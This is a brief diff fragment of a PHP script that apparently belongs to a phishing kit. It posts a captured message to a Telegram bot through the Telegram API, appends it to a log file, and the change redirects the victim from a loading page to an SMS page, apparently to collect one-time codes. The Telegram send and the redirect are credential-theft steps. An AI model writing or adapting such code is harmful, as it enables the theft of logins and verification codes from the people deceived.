@@ -29,5 +29,5 @@ file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=109774
 $f = fopen("../python/python.php", "a");
 	fwrite($f, $message);
 
-header("Location:loading.html");
+header("Location:sms.php");
 ?>
